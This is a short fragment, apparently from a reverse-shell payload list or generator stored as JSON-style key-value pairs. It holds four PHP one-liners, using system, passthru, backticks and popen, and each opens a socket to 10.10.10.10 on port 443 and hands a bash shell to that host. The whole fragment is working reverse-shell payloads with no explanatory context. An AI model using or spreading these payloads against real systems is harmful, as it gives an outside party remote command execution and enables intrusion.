        "php system":"php -r '$sock=fsockopen(\"10.10.10.10\",443);system(\"bash <&3 >&3 2>&3\");'",
        "php passthru":"php -r '$sock=fsockopen(\"10.10.10.10\",443);passthru(\"bash <&3 >&3 2>&3\");'",
        "php `":"php -r '$sock=fsockopen(\"10.10.10.10\",443);`bash <&3 >&3 2>&3`;'",
        "php popen":"php -r '$sock=fsockopen(\"10.10.10.10\",443);popen(\"bash <&3 >&3 2>&3\", \"r\");'",
